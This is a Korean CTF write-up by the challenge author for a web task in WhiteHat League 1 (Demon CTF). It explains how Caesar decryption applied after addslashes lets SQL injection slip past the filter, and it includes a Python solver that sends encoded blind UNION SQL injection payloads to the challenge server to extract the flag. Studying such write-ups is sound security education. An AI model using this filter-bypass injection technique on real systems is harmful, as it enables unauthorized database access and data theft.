# WhiteHat League 1 - Demon CTF [![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg)](https://github.com/sindresorhus/awesome)
Mini kubed Write-Up - 출제자 풀이
-----------------------------------

## Introduce
* Author : 박광호 ([debukuk](http://debu.kr/))
* Field  : Web
* E-Mail : debukuk154@gmail.com
* Date   : 2017-09-12

## Intention
* sql injection 필터링이 되는데 이걸 카이사르 디코딩이 되면서 우회를 할 수 있는가?
* sleep based sql injection 을 할 수 있는가?
* 플래그 형식은 **Demon{...}**

## Solve
* 공방전 플래그를 따보자 슥슥

auth 함수를 보면 $flag = decrypt( $flag, 0x7 ); 이부분에서 카이사르 decrypt 를 해주는데(`$r .= chr( ord( $plain[ $i ] ) - $key );`) 카이사르 복호화를 진행하면서 sqli_filter 함수에서 addslashes 함수로 sql injection을 방어하던 코드가 우회됩니다.<br>

그래서 auth 부분에 인젝션을 해서 플래그를 뽑아내면 됩니다.<br>

### Solver
~~~python

import requests

ret = ''

def encrypt(val, key):
    rst = ''
    for i in range(0, len(val)):
        rst += chr(ord(val[i])+key)
    return rst

"""
def decrypt(val, key):
    rst = ''
    for i in range(0, len(val)):
        rst += chr(ord(val[i])-key)
    return rst
"""

for i in range(1, 39 + 1):
    for j in range(32 + 0x7, 127):
        payload = "'/**/union/**/select/**/1,0,3,if(ascii(substr((select/**/flag/**/from/**/task/**/where/**/score=99999999)," + str(i) + ",1))=" + str(j) + ",1,0)#"
        s = requests.Session()
        r = s.post('http://s1.forensics.site/?auth', {'flag': encrypt(payload, 0x7)}, cookies={'_token': "h059uj7mee1v74h0nu1gie66r3", "pangho_dd": 'asdsa'})
        if (r.text).find("Congratz") != -1:
            ret += chr(j)
            print("[*] So far till '" + ret + "' & '" + encrypt(ret, 0x7) + "' result")
            break

print("End result: " + ret)
print("End decoding result: " + encrypt(ret, 0x7))
~~~
